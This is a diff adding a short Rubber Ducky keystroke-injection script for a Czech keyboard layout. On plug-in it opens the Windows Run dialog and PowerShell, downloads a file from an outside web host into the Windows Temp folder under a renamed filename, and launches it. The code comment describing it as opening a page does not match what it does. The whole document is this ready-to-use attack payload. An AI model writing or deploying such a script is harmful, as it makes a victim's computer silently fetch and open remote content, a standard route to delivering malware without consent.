@@ -1,0 +1,13 @@
+DUCKY_LANG CS
+DELAY 600
+GUI r
+DELAY 200
+REM Type in URL and open page!
+STRING powershell
+ENTER
+DELAY 200
+STRING Invoke-WebRequest -Uri "https://spajk.cz/ftp/deti/online_zoo.pdf" -OutFile "C:\windows\Temp\basnicky.pdf"
+ENTER
+DELAY 200
+STRING Start-Process "C:\windows\Temp\basnicky.pdf"
+ENTER
